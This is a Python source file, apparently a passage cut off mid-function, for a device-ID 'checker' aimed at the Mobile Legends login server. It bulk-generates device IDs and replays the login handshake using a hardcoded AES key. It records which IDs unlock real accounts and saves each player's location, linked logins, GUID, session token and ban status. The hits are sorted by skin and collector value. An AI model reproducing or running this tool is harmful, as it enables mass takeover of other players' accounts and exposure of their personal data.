from __future__ import annotations
import asyncio
import hashlib
import os
import random
import re
import socket
import struct
import sys
import threading
import time
import uuid
import zlib
from enum import Enum
from typing import Any, List, Optional, Tuple
from datetime import datetime, timezone, timedelta
from queue import Queue
from concurrent.futures import ThreadPoolExecutor

import zstandard as zstd
from Crypto.Cipher import AES

def _enable_windows_ansi():
    if os.name == 'nt':
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass
        try:
            os.system('')
        except Exception:
            pass

_enable_windows_ansi()


LOGIN_HOST = os.environ.get('MLBB_LOGIN_HOST', 'login.ml.youngjoygame.com')
LOGIN_PORT = int(os.environ.get('MLBB_LOGIN_PORT', 30021))
CLI_VER = os.environ.get('MLBB_CLI_VER', '2.2.16.1232.1')
CHANNEL = os.environ.get('MLBB_CHANNEL', 'and_usa')
LANG = os.environ.get('MLBB_LANG', 'en')
CONN_TO = float(os.environ.get('MLBB_CONN_TO', '3.0'))
READ_TO = float(os.environ.get('MLBB_READ_TO', '3.5'))
_AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
_AES_IV = b'\x00' * 16

RESULTS_DIR = "results"
TZ_WIB = timezone(timedelta(hours=7))

_MIN_VALID_TS = 1451577600

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE_AND  = os.path.join(BASE_DIR, "generated_and_devices.txt")
OUTPUT_FILE_IOS  = os.path.join(BASE_DIR, "generated_ios_devices.txt")
OUTPUT_FILE_BOTH = os.path.join(BASE_DIR, "generated_devices.txt")

GEN_THREADS = 32
GEN_CHUNK_SIZE = 50000

HEX_CHARS = "0123456789abcdef"
ALNUM_LOWER = "abcdefghijklmnopqrstuvwxyz0123456789"

HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal",
    7: "Alucard", 8: "Karina", 9: "Akai", 10: "Franco", 11: "Bane", 12: "Bruno",
    13: "Clint", 14: "Rafaela", 15: "Eudora", 16: "Zilong", 17: "Fanny", 18: "Layla",
    19: "Minotaur", 20: "Lolita", 21: "Hayabusa", 22: "Freya", 23: "Gord", 24: "Natalia",
    25: "Kagura", 26: "Chou", 27: "Sun", 28: "Alpha", 29: "Ruby", 30: "Yi Sun-shin",
    31: "Moskov", 32: "Johnson", 33: "Cyclops", 34: "Estes", 35: "Hilda", 36: "Aurora",
    37: "Lapu-Lapu", 38: "Vexana", 39: "Roger", 40: "Karrie", 41: "Gatotkaca", 42: "Harley",
    43: "Irithel", 44: "Grock", 45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie",
    49: "Hylos", 50: "Zhask", 51: "Helcurt", 52: "Pharsa", 53: "Lesley", 54: "Jawhead",
    55: "Angela", 56: "Gusion", 57: "Valir", 58: "Martis", 59: "Uranus", 60: "Hanabi",
    61: "Chang'e", 62: "Kaja", 63: "Selena", 64: "Aldous", 65: "Claude", 66: "Vale",
    67: "Leomord", 68: "Lunox", 69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz",
    73: "Harith", 74: "Minsitthar", 75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra",
    79: "Granger", 80: "Guinevere", 81: "Esmeralda", 82: "Terizla", 83: "X.Borg", 84: "Ling",
    85: "Dyrroth", 86: "Lylia", 87: "Baxia", 88: "Masha", 89: "Wanwan", 90: "Silvanna",
    91: "Cecilion", 92: "Carmilla", 93: "Atlas", 94: "Popol and Kupa", 95: "Yu Zhong",
    96: "Luo Yi", 97: "Benedetta", 98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve",
    102: "Mathilda", 103: "Paquito", 104: "Gloo", 105: "Beatrix", 106: "Phoveus",
    107: "Natan", 108: "Aulus", 109: "Aamon", 110: "Valentina", 111: "Edith", 112: "Floryn",
    113: "Yin", 114: "Melissa", 115: "Xavier", 116: "Julian", 117: "Fredrinn", 118: "Joy",
    119: "Novaria", 120: "Arlott", 121: "Ixia", 122: "Nolan", 123: "Cici", 124: "Chip",
    125: "Zhuxin", 126: "Suyou", 127: "Lukas", 128: "Kalea", 129: "Zetian", 130: "Obsidia"
}

_RANK_DEFINITIONS = [
    (0, 3, "Warrior III"),
    (4, 7, "Warrior II"),
    (8, 11, "Warrior I"),

    (12, 16, "Elite III"),
    (17, 21, "Elite II"),
    (22, 26, "Elite I"),

    (27, 31, "Master IV"),
    (32, 36, "Master III"),
    (37, 41, "Master II"),
    (42, 46, "Master I"),

    (47, 52, "Grandmaster V"),
    (53, 58, "Grandmaster IV"),
    (59, 64, "Grandmaster III"),
    (65, 70, "Grandmaster II"),
    (71, 76, "Grandmaster I"),

    (77, 82, "Epic V"),
    (83, 88, "Epic IV"),
    (89, 94, "Epic III"),
    (95, 100, "Epic II"),
    (101, 106, "Epic I"),

    (107, 112, "Legend V"),
    (113, 118, "Legend IV"),
    (119, 124, "Legend III"),
    (125, 130, "Legend II"),
    (131, 136, "Legend I"),
]

COLLECTOR_TIERS = [
    (1000, 4000, "Amateur Collector"), (4000, 10000, "Junior Collector"),
    (10000, 22000, "Seasoned Collector"), (22000, 44000, "Expert Collector"),
    (44000, 84000, "Renowned Collector"), (84000, 160000, "Exalted Collector"),
    (160000, 280000, "Mega Collector"), (280000, float("inf"), "World Collector")
]

AFFINITY_MAP = {0: "None", 1: "Bronze", 2: "Silver", 3: "Gold", 4: "Platinum", 5: "Diamond"}
ROMAN = ["V", "IV", "III", "II", "I"]

SKIN_TIER_LABELS = {
    'common':      'Common',
    'exceptional': 'Exceptional',
    'deluxe':      'Deluxe',
    'exquisite':   'Exquisite',
    'grand':       'Grand',
    'supreme':     'Supreme',
    'unknown':     'Unknown',
}

SKIN_DB = {}
try:
    import json
    _SKIN_DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skin_db.json')
    if os.path.exists(_SKIN_DB_PATH):
        with open(_SKIN_DB_PATH, 'r', encoding='utf-8') as _f:
            _raw = _f.read().strip()
            if _raw:
                if not _raw.startswith('{'):
                    _raw = '{' + _raw
                SKIN_DB = json.loads(_raw)
except Exception:
    pass

def get_skin_tier(skin_id):
    if not SKIN_DB:
        return None
    tier = SKIN_DB.get(str(skin_id))
    if not tier:
        return None
    return SKIN_TIER_LABELS.get(tier, tier.capitalize())

def parse_skin_counts(tag_118):
    if not tag_118 or not isinstance(tag_118, dict):
        return {}
    skin_data = None
    for k in (4, '4'):
        v = tag_118.get(k)
        if isinstance(v, dict) and v:
            skin_data = v
            break
    if skin_data is None:
        skin_data = tag_118
    if not isinstance(skin_data, dict):
        return {}
    skin_types = {
        6: "Supreme Skins",
        5: "Grand Skins", 
        4: "Exquisite Skins",
        3: "Deluxe Skins",
        2: "Exceptional Skins",
        1: "Common Skins"
    }
    skin_counts = {}
    for skin_id, count in skin_data.items():
        try:
            skin_id_int = int(skin_id)
        except (ValueError, TypeError):
            continue
        if skin_id_int in skin_types:
            skin_counts[skin_types[skin_id_int]] = count
    return skin_counts

W = '\x1b[0m'
BD = '\x1b[1m'
DM = '\x1b[2m'
BW = 46

CYAN = (0, 200, 220)
PURPLE = (160, 80, 255)
PINK = (255, 80, 180)
BLUE = (60, 120, 255)
GREEN = (80, 220, 120)
GOLD = (255, 200, 60)
RED = (255, 70, 70)
WHITE = (230, 230, 240)
GRAY = (100, 110, 130)
TEAL = (0, 180, 180)
MINT = (100, 255, 200)
LAVENDER = (180, 140, 255)
SUNSET = (255, 120, 80)
CORAL = (255, 100, 130)
A1, A2 = (CYAN, PURPLE)
H1, H2 = (GREEN, MINT)
V1, V2 = (CYAN, LAVENDER)


def rgb(r, g, b):
    return f'\x1b[38;2;{r};{g};{b}m'


def lerp(a, b, t):
    return int(a + (b - a) * t)


def gradient_text(text, c1, c2):
    if not text:
        return ''
    out = ''
    for i, ch in enumerate(text):
        t = i / max(len(text) - 1, 1)
        r = lerp(c1[0], c2[0], t)
        g = lerp(c1[1], c2[1], t)
        b = lerp(c1[2], c2[2], t)
        out += f'{rgb(r, g, b)}{ch}'
    return out + W


def c(color):
    return rgb(*color)


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def p(text, end='\n'):
    try:
        print(text, end=end, flush=True)
    except UnicodeEncodeError:
        print(text.encode('ascii', 'ignore').decode('ascii'), end=end, flush=True)


def gtop(c1=A1, c2=A2, w=BW):
    return gradient_text('+' + '=' * (w - 2) + '+', c1, c2)


def gbot(c1=A1, c2=A2, w=BW):
    return gradient_text('+' + '=' * (w - 2) + '+', c1, c2)


def gmid(c1=A1, c2=A2, w=BW):
    return gradient_text('+' + '=' * (w - 2) + '+', c1, c2)


def gdash(c1=A1, c2=A2, w=BW):
    return gradient_text('+' + '-' * (w - 2) + '+', c1, c2)


def grow(text, c1=A1, c2=A2, w=BW):
    vlen = 0
    inside = False
    for ch in text:
        if ch == '\x1b':
            inside = True
        elif inside and ch == 'm':
            inside = False
        elif not inside:
            vlen += 1
    pad = w - 4 - vlen
    if pad < 0:
        pad = 0
    return f"{c(c1)}|{W} {text}{' ' * pad} {c(c2)}|{W}"


def gtitle(text, c1=A1, c2=A2, w=BW):
    vlen = 0
    inside = False
    for ch in text:
        if ch == '\x1b':
            inside = True
        elif inside and ch == 'm':
            inside = False
        elif not inside:
            vlen += 1
    total_pad = w - 4 - vlen
    left = total_pad // 2
    right = total_pad - left
    return f"{c(c1)}|{W}{' ' * (left + 1)}{text}{' ' * (right + 1)}{c(c2)}|{W}"


def print_banner():
    lines = [' XEI DEVICE ID TOOLS ']
    colors_start = [(0, 180, 255), (80, 140, 255), (160, 100, 255)]
    colors_end = [(160, 80, 255), (200, 60, 220), (255, 60, 180)]
    p('')
    p(f" {gradient_text('+' + '-' * 32 + '+', CYAN, PURPLE)}")
    p(f' {c(CYAN)}|{W}                    {c(PURPLE)}|{W}')
    for i, line in enumerate(lines):
        padded = f'{line:^32}'
        p(f' {c(CYAN)}|{W}{gradient_text(padded, colors_start[i], colors_end[i])}{c(PURPLE)}|{W}')
    p(f' {c(CYAN)}|{W}                    {c(PURPLE)}|{W}')
    sub = 'Made by Xei TG @xeiloves'
    p(f" {c(CYAN)}|{W}{gradient_text(f'{sub:^32}', GOLD, SUNSET)}{c(PURPLE)}|{W}")
    p(f' {c(CYAN)}|{W}                    {c(PURPLE)}|{W}')
    p(f" {gradient_text('+' + '-' * 32 + '+', CYAN, PURPLE)}")
    p('')


def fmt_dur(secs):
    secs = max(0, int(secs))
    h = secs // 3600
    m = secs % 3600 // 60
    s = secs % 60
    if h > 0:
        return f'{h}h {m}m {s}s'
    if m > 0:
        return f'{m}m {s}s'
    return f'{s}s'


def fmt_timestamp(timestamp):
    try:
        t = int(timestamp)
        if t <= 0:
            return "Never"
        diff = max(0, int(time.time()) - t)
        d = diff // 86400
        h = (diff % 86400) // 3600
        m = (diff % 3600) // 60
        if d > 0:
            return f"{d}d {h}h ago"
        if h > 0:
            return f"{h}h {m}m ago"
        return f"{m}m ago"
    except Exception:
        return str(timestamp)


def fmt_timestamp_full(timestamp):
    try:
        t = int(timestamp)
        if t <= 0:
            return "N/A"
        dt = datetime.fromtimestamp(t)
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(timestamp)


def fmt_age(timestamp):

    try:
        t = int(timestamp)
        if t <= 0 or t < _MIN_VALID_TS:
            return "N/A"
        now = int(time.time())
        diff = max(0, now - t)
        days = diff // 86400
        years = days // 365
        rem_days = days % 365
        months = rem_days // 30
        rem_days = rem_days % 30
        parts = []
        if years > 0:
            parts.append(f"{years} year{'s' if years != 1 else ''}")
        if months > 0:
            parts.append(f"{months} month{'s' if months != 1 else ''}")
        if not parts:
            if days > 0:
                parts.append(f"{days} day{'s' if days != 1 else ''}")
            else:
                hours = diff // 3600
                parts.append(f"{hours} hour{'s' if hours != 1 else ''}")
        return ", ".join(parts) + " old"
    except Exception:
        return "N/A"


def skin_rows(skins, max_w=42):
    if not skins:
        return ["No valid hits yet", ""]
    if len(skins) <= 8:
        return [', '.join(str(x) for x in skins), ""]
    low = ', '.join(str(x) for x in skins[:8])
    high = ', '.join(str(x) for x in skins[-8:])
    return [low, high]

def hero_name(hid):
    return HERO_ID_MAP.get(hid, f"Hero({hid})")

def map_rank(p):
    if p is None:
        return "Unknown"
    try:
        p = int(p)
    except Exception:
        return "Unknown"
    for lo, hi, name in _RANK_DEFINITIONS:
        if lo <= p <= hi:
            return name
    if 137 <= p <= 161:
        return f"Mythic {p - 136}"
    if 162 <= p <= 186:
        return f"Mythical Honor {p - 136}"
    if 187 <= p <= 236:
        return f"Mythical Glory {p - 136}"
    if 237 <= p <= 9999:
        return f"Mythical Immortal {p - 136}"
    return "Unknown"

def collector_tier_str(pts):
    try:
        pts = int(pts)
    except Exception:
        return "No Tier"
    if pts < 1000:
        return "No Tier"
    for lo, hi, name in COLLECTOR_TIERS:
        if lo <= pts < hi:
            if hi == float("inf"):
                return name
            idx = min(4, int((pts - lo) // ((hi - lo) / 5)))
            return f"{name} {ROMAN[idx]}"
    return "Unknown"


def collector_base_tier(tier_str):
    if not tier_str or tier_str == "No Tier":
        return "No Tier"
    for _, _, name in COLLECTOR_TIERS:
        if tier_str.startswith(name):
            return name
    return "No Tier"


def get_hero_history(tag_91):
    if not tag_91 or not isinstance(tag_91, list):
        return []
    heroes = []
    seen = set()
    for hid in reversed(tag_91):
        try:
            hid = int(hid)
            if hid not in seen:
                seen.add(hid)
                heroes.append(hero_name(hid))
        except Exception:
            pass
        if len(heroes) >= 10:
            break
    return heroes


def parse_bindings(pd):
    bindings = []
    if pd.get(12, 0):
        bindings.append("Facebook")
    if pd.get(13, 0):
        bindings.append("Google")
    if pd.get(118, 0):
        bindings.append("VK")
    if pd.get(119, 0):
        bindings.append("Apple")
    if pd.get(121, 0):
        bindings.append("Phone")
    if pd.get(122, 0):
        bindings.append("Email")
    if pd.get(123, 0):
        bindings.append("Moonton")
    return ", ".join(bindings) if bindings else "None"


def extract_player_data(result, role_info=None, creation_ts=0) -> Optional[dict]:
    if not result:
        return None
    try:
        player_list = result.get(0)
        if not player_list:
            return None
        if isinstance(player_list, (dict, SDP)):
            pd = player_list
        elif isinstance(player_list, list):
            if len(player_list) == 0:
                return None
            pd = player_list[0]
        else:
            return None
        if not isinstance(pd, (dict, SDP)):
            return None
        
        nickname = str(pd.get(2, "") or "").strip() or "Unknown"
        player_id = pd.get(0, "Unknown")
        server_id = pd.get(1, "Unknown")
        level = int(pd.get(3, 0) or 0)
        
        skin_count = int(pd.get(83, 0) or 0)
        hero_count = int(pd.get(4, 0) or 0)
        
        current_rank = map_rank(pd.get(8))
        high_rank = map_rank(pd.get(95))
        achievement_points = int(pd.get(7, 0) or 0)
        
        collector_pts = 0
        collector_rank = 0
        t136 = pd.get(136)
        if isinstance(t136, (dict, SDP)):
            collector_pts = int(t136.get(9, 0) or 0)
            collector_rank = int(t136.get(10, 0) or 0)
        collector_tier = collector_tier_str(collector_pts)
        
        squad_name = str(pd.get(30, "") or "").replace("`", "").strip()
        squad_icon = str(pd.get(31, "") or "")
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else "—"
        
        squad_id = 0
        if role_info and isinstance(role_info, (dict, SDP)):
            squad_id = int(role_info.get(34, 0) or 0)
        if not squad_id:
            squad_id = int(pd.get(34, pd.get(28, 0)) or 0)
        squad_id_display = f"Squad ID: {squad_id}" if squad_id else "N/A"
        
        aff_lv = 0
        t135 = pd.get(135)
        if isinstance(t135, (dict, SDP)):
            aff_lv = int(t135.get(1, 0) or 0)
        affinity = AFFINITY_MAP.get(aff_lv, f"Lv{aff_lv}") if aff_lv else "None"
        
        wins = int(pd.get(18, 0) or 0)
        losses = int(pd.get(155, 0) or 0)
        total_battles_fallback = wins + losses
        win_rate_fallback = f"{wins / total_battles_fallback * 100:.1f}%" if total_battles_fallback > 0 else "N/A"
        
        t91 = pd.get(91, [])
        hero_history = get_hero_history(t91) if t91 else []
        last_hero = hero_history[0] if hero_history else "N/A"
        prev_heroes = hero_history[1:6] if len(hero_history) > 1 else []
        
        location = "NOT FOUND"
        location_data = pd.get(71, None)
        if location_data and isinstance(location_data, list) and len(location_data) >= 2:
            location = ", ".join(str(x) for x in location_data)
        
        last_login_raw = pd.get(5, 0)
        last_login = fmt_timestamp(last_login_raw) if last_login_raw else "Never"
        last_login_country = pd.get(87, "Unknown") or "Unknown"
        create_country = pd.get(97, "Unknown") or "Unknown"
        
        bindings = parse_bindings(pd)
        
        followers = 0
        if role_info and isinstance(role_info, (dict, SDP)):
            followers = int(role_info.get(23, 0) or 0)
        if not followers:
            followers = int(pd.get(15, 0) or 0)
        
        popularity = int(pd.get(14, 0) or 0)
        
        likes = 0
        if role_info and isinstance(role_info, (dict, SDP)):
            likes = int(role_info.get(24, 0) or 0)
        if not likes:
            likes = int(pd.get(61, 0) or 0)
        
        credits_score = None
        t111 = pd.get(111, {})
        if isinstance(t111, (dict, SDP)):
            cs = t111.get(0, 0)
            if cs:
                credits_score = f"{cs}/110"
        
        latest_skin_id = int(pd.get(175, 0) or 0)
        latest_skin_tier = get_skin_tier(latest_skin_id) if latest_skin_id else None
        latest_skin_date = fmt_timestamp(pd.get(176, 0)) if pd.get(176, 0) else None
        
        sl_expiry = pd.get(50, 0)
        if sl_expiry and isinstance(sl_expiry, int) and sl_expiry > time.time():
            starlight_user = "Yes"
        else:
            starlight_user = "No"
        
        restriction_flags = "None"
        flags_val = 0
        if role_info and isinstance(role_info, (dict, SDP)):
            flags_val = int(role_info.get(102, 0) or 0)
        if not flags_val:
            t135_flags = pd.get(135, {})
            if isinstance(t135_flags, (dict, SDP)):
                flags_val = int(t135_flags.get(0, 0) or 0)
        if flags_val:
            set_bits = bin(int(flags_val)).count('1')
            total_bits = 7
            pct = round((set_bits / total_bits) * 100, 1)
            if pct < 30:
                risk = "Low Risk"
            elif pct < 60:
                risk = "Medium Risk"
            else:
                risk = "High Risk"
            restriction_flags = f"{pct}% ({risk})"
        
        last_heroes_purchase = "N/A"
        t45 = pd.get(45, {})
        if isinstance(t45, (dict, SDP)) and t45:
            hero_entries = []
            for entry in t45.values():
                if isinstance(entry, (dict, SDP)):
                    hid = entry.get(0, 0)
                    hts = entry.get(1, 0)
                    if hid:
                        hero_entries.append((hts, hero_name(hid)))
            hero_entries.sort(key=lambda x: x[0], reverse=True)
            if hero_entries:
                last_heroes_purchase = ", ".join(h for _, h in hero_entries[:5])
        
        mcl_wins = 0
        if role_info and isinstance(role_info, (dict, SDP)):
            mcl_wins = int(role_info.get(46, 0) or 0)
        if not mcl_wins:
            mcl_wins = int(pd.get(104, pd.get(103, 0)) or 0)
        
        # Creation date resolution
        creation_date = "N/A"
        creation_ts_resolved = 0
        if creation_ts and creation_ts >= _MIN_VALID_TS:
            creation_date = fmt_timestamp_full(creation_ts)
            creation_ts_resolved = creation_ts
        else:
            _create_ts_fallback = pd.get(6, 0)
            if _create_ts_fallback and _create_ts_fallback >= _MIN_VALID_TS:
                creation_date = fmt_timestamp_full(_create_ts_fallback)
                creation_ts_resolved = _create_ts_fallback
        
        creation_age = fmt_age(creation_ts_resolved) if creation_ts_resolved else "N/A"
        
        _tag118 = None
        if role_info and isinstance(role_info, (dict, SDP)):
            _tag118 = role_info.get(118)
        if not _tag118:
            _tag118 = pd.get(118, {})
        skin_breakdown = parse_skin_counts(_tag118)
        
        rating_score = int(pd.get(9, 0) or 0)
        
        win_count = 0
        if role_info and isinstance(role_info, (dict, SDP)):
            win_count = int(role_info.get(22, 0) or 0)
        
        total_battles = 0
        if role_info and isinstance(role_info, (dict, SDP)):
            total_battles = int(role_info.get(77, 0) or 0)
        if not total_battles:
            total_battles = int(pd.get(17, 0) or 0)
        if not total_battles:
            total_battles = total_battles_fallback
        
        if total_battles > 0 and win_count > 0:
            win_rate = f"{(win_count / total_battles * 100):.1f}%"
        elif total_battles_fallback > 0 and wins > 0:
            win_rate = win_rate_fallback
        else:
            win_rate = "N/A"
        
        squad_motto = None
        if role_info and isinstance(role_info, (dict, SDP)):
            _motto = role_info.get(24, "")
            if _motto and isinstance(_motto, str):
                squad_motto = _motto
        
        starlight_count = 0
        if role_info and isinstance(role_info, (dict, SDP)):
            starlight_count = int(role_info.get(60, 0) or 0)
        
        skin_history = None
        if role_info and isinstance(role_info, (dict, SDP)):
            _tag92 = role_info.get(92, [])
            if isinstance(_tag92, list):
                _sh_parts = []
                for _entry in _tag92[:5]:
                    if isinstance(_entry, (dict, SDP)):
                        _sid  = _entry.get(0, 0)
                        _tier = _entry.get(2, 0)
                        _ts   = _entry.get(4, 0)
                        _tier_name = {1:"Common",2:"Exceptional",3:"Deluxe",
                                      4:"Exquisite",5:"Grand",6:"Supreme"}.get(_tier, f"T{_tier}")
                        _date = fmt_timestamp(_ts) if _ts else "?"
                        _sh_parts.append(f"SkinID:{_sid}({_tier_name})|{_date}")
                if _sh_parts:
                    skin_history = ", ".join(_sh_parts)
        
        emblem_levels = None
        if role_info and isinstance(role_info, (dict, SDP)):
            _tag101 = role_info.get(101, {})
            if isinstance(_tag101, (dict, SDP)) and _tag101:
                _EMBLEM_MAP = {1:"Fighter",2:"Assassin",3:"Mage",4:"Marksman",
                               5:"Support",6:"Tank",7:"Common"}
                _parts = []
                for _eid in sorted(_tag101.keys()):
                    _ename = _EMBLEM_MAP.get(_eid, f"E{_eid}")
                    _parts.append(f"{_ename}:Lv{_tag101[_eid]}")
                if _parts:
                    emblem_levels = ", ".join(_parts)
        
        return {
            "nickname": nickname,
            "player_id": player_id,
            "server_id": server_id,
            "level": level,
            "skin_count": skin_count,
            "hero_count": hero_count,
            "total_battles": total_battles,
            "wins": win_count if win_count else wins,
            "win_rate": win_rate,
            "rating_score": rating_score,
            "achievement_points": achievement_points,
            "current_rank": current_rank,
            "high_rank": high_rank,
            "collector_point": collector_pts,
            "collector_rank": collector_rank,
            "collector_tier": collector_tier,
            "squad": squad,
            "squad_id": squad_id_display,
            "squad_motto": squad_motto,
            "last_hero": last_hero,
            "prev_heroes": prev_heroes,
            "hero_history": hero_history,
            "location": location,
            "last_login": last_login,
            "last_login_country": last_login_country,
            "create_country": create_country,
            "bindings": bindings,
            "followers": followers,
            "popularity": popularity,
            "likes": likes,
            "credits_score": credits_score,
            "affinity": affinity,
            "latest_skin_id": str(latest_skin_id) if latest_skin_id else None,
            "latest_skin_tier": latest_skin_tier,
            "latest_skin_date": latest_skin_date,
            "skin_breakdown": skin_breakdown,
            "skin_history": skin_history,
            "starlight_user": starlight_user,
            "starlight_count": starlight_count if starlight_count else None,
            "restriction_flags": restriction_flags,
            "last_heroes_purchase": last_heroes_purchase,
            "mcl_champion_wins": mcl_wins,
            "creation_date": creation_date,
            "creation_ts": creation_ts_resolved,
            "creation_age": creation_age,
            "emblem_levels": emblem_levels,
        }
    except Exception:
        return None


def format_result_line(res: dict) -> str:
    acc = res['acc']
    zone = res['zone']
    did = res['did']
    player = res.get('player')
    ban_info = res.get('ban_info', {})
    account_info = res.get('account_info', {})
    
    if player:
        prev = ", ".join(player["prev_heroes"]) if player["prev_heroes"] else "N/A"
        skin_bd = player.get('skin_breakdown', {})
        skin_bd_str = f"Supreme:{skin_bd.get('Supreme Skins', 0)} Grand:{skin_bd.get('Grand Skins', 0)} Exq:{skin_bd.get('Exquisite Skins', 0)} Deluxe:{skin_bd.get('Deluxe Skins', 0)} Except:{skin_bd.get('Exceptional Skins', 0)} Common:{skin_bd.get('Common Skins', 0)}"
        
        parts = [
            f"Account: {acc}",
            f"Zone: {zone}",
            f"Name: {player['nickname']}",
            f"Level: {player['level']}",
            f"Rank: {player['current_rank']}",
            f"Highest Rank: {player['high_rank']}",
            f"Skins: {player['skin_count']}",
            f"Heroes: {player['hero_count']}",
            f"Battles: {player['total_battles']}",
            f"Wins: {player['wins']}",
            f"WR: {player['win_rate']}",
            f"Last Hero: {player['last_hero']}",
            f"Prev: {prev}",
            f"Squad: {player['squad']}",
            f"Squad ID: {player.get('squad_id', 'N/A')}",
            f"Collector: {player['collector_tier']}",
            f"Collector Pts: {player['collector_point']}",
            f"Affinity: {player['affinity']}",
            f"Last Login: {player['last_login']}",
            f"Country: {player['last_login_country']}",
            f"Reg: {player['create_country']}",
            f"Bindings: {player.get('bindings', 'N/A')}",
            f"Followers: {player.get('followers', 0)}",
            f"Likes: {player.get('likes', 0)}",
            f"Popularity: {player.get('popularity', 0)}",
        ]
        
        if player.get('credits_score'):
            parts.append(f"Credits: {player['credits_score']}")
        if player.get('latest_skin_date'):
            parts.append(f"Latest Skin Date: {player['latest_skin_date']}")
        if player.get('latest_skin_id'):
            parts.append(f"Latest Skin ID: {player['latest_skin_id']}")
        if player.get('latest_skin_tier'):
            parts.append(f"Latest Skin Tier: {player['latest_skin_tier']}")
        if player.get('starlight_user'):
            parts.append(f"Starlight: {player['starlight_user']}")
        if player.get('starlight_count'):
            parts.append(f"Starlight Count: {player['starlight_count']}")
        if player.get('restriction_flags'):
            parts.append(f"Restriction: {player['restriction_flags']}")
        if player.get('last_heroes_purchase'):
            parts.append(f"Last Heroes: {player['last_heroes_purchase']}")
        if player.get('mcl_champion_wins'):
            parts.append(f"MCL Wins: {player['mcl_champion_wins']}")
        if player.get('creation_date'):
            parts.append(f"Created: {player['creation_date']}")
        if player.get('creation_age'):
            parts.append(f"Age: {player['creation_age']}")
        if player.get('squad_motto'):
            parts.append(f"Squad Motto: {player['squad_motto']}")
        if player.get('emblem_levels'):
            parts.append(f"Emblems: {player['emblem_levels']}")
        if player.get('skin_history'):
            parts.append(f"Skin History: {player['skin_history']}")
        
        parts.append(f"DevID: {did}")
        line = " | ".join(parts)
    else:
        line = f"Account: {acc} | Zone: {zone} | DevID: {did}"
    
    if account_info:
        guid = account_info.get('guid', 'N/A')
        session = account_info.get('session', 'N/A')
        line += f" | GUID: {guid} | Session: {session[:20] if session else 'N/A'}..."
    
    if ban_info:
        status = ban_info.get('status', 'UNKNOWN')
        if status == 'BANNED':
            line += f" | BAN STATUS: BANNED | Code: {ban_info.get('ban_code', 'N/A')} | Reason: {ban_info.get('reason', 'N/A')} | Duration: {ban_info.get('duration', 'N/A')}"
        elif status == 'NOT BANNED':
            line += " | BAN STATUS: CLEAN"
        else:
            line += " | BAN STATUS: UNKNOWN"
    
    return line

_write_lock = threading.Lock()

TIER_FILE_MAP = {
    "Amateur Collector": "amateur_collector.txt",
    "Junior Collector": "junior_collector.txt",
    "Seasoned Collector": "seasoned_collector.txt",
    "Expert Collector": "expert_collector.txt",
    "Renowned Collector": "renowned_collector.txt",
    "Exalted Collector": "exalted_collector.txt",
    "Mega Collector": "mega_collector.txt",
    "World Collector": "world_collector.txt",
    "No Tier": "no_tier.txt",
}


def _append(filepath, content):
    with _write_lock:
        try:
            os.makedirs(os.path.dirname(filepath), exist_ok=True)
            with open(filepath, 'a', encoding='utf-8', buffering=1) as f:
                f.write(content + '\n')
                f.flush()
                os.fsync(f.fileno())
        except Exception:
            pass


def save_result(res: dict):
    line = format_result_line(res)
    ban_info = res.get('ban_info', {})
    status = ban_info.get('status', 'UNKNOWN')
    
    if status == 'BANNED':
        _append(os.path.join(RESULTS_DIR, 'banned.txt'), line)
        return
    
    _append(os.path.join(RESULTS_DIR, 'valid.txt'), line)
    
    player = res.get('player')
    if player:
        base = collector_base_tier(player.get('collector_tier', 'No Tier'))
        fname = TIER_FILE_MAP.get(base, 'no_tier.txt')
        _append(os.path.join(RESULTS_DIR, fname), line)
        
        skin_bd = player.get('skin_breakdown', {})
        for tier_name, count in skin_bd.items():
            if count > 0:
                tier_file = os.path.join(RESULTS_DIR, f"skin_{tier_name.lower().replace(' ', '_')}.txt")
                _append(tier_file, line)
    
    if status == 'NOT BANNED':
        _append(os.path.join(RESULTS_DIR, 'clean_ban.txt'), line)
    elif status == 'UNKNOWN':
        _append(os.path.join(RESULTS_DIR, 'unknown_ban.txt'), line)


def save_valid_only(res: dict):
    """Save only valid Device ID to results/valid.txt"""
    did = res.get('did')
    if did:
        _append(os.path.join(RESULTS_DIR, 'valid.txt'), did)


# ============================================================
# FAST VALID-ONLY CHECKER (optimized — no ban check, no GS)
# ============================================================

def _fast_valid_check(device_id: str, timeout: float = 4.0) -> bool:
    """
    Fast synchronous check: only does login handshake.
    Returns True if Device ID is valid (account exists).
    No ban check, no game server connection, no player info.
    """
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((LOGIN_HOST, LOGIN_PORT))
        
        # Build login frame
        p = device_id.split('_')
        info = p[1] if len(p) >= 2 else device_id
        if len(p) >= 3 and len(info) < 32:
            info += '_' + p[2]
        md5 = info[:32] if len(info) >= 32 else info
        aid = info[32:48] if len(info) >= 48 else ''
        adv = info[48:] if len(info) > 48 else ''
        
        payload = SDP({
            0: device_id,
            1: f'gps_adid={adv}&android_id={aid}&device_unique_id={md5}',
            2: CLI_VER,
            3: CHANNEL,
            4: LANG
        }).data
        frame = _frame(1, 1, payload)
        sock.sendall(frame)
        
        # Read response header (4 bytes)
        hdr = b''
        while len(hdr) < 4:
            chunk = sock.recv(4 - len(hdr))
            if not chunk:
                return False
            hdr += chunk
        
        flags = int.from_bytes(hdr, 'big')
        size = flags & 0xFFFFFF
        ct = flags >> 24
        
        # Read body
        body = b''
        remaining = size - 4
        while len(body) < remaining:
            chunk = sock.recv(remaining - len(body))
            if not chunk:
                return False
            body += chunk
        
        body = _decode(ct, body)
        outer = SDP(body)
        if outer.get(0) != 2:
            return False
        
        raw = outer.get(6) or outer.get(5)
        if not isinstance(raw, bytes):
            return False
        
        inner = SDP(raw)
        acc = inner.get(0)
        
        # Valid if we got a real account ID back
        return bool(acc and acc > 0)
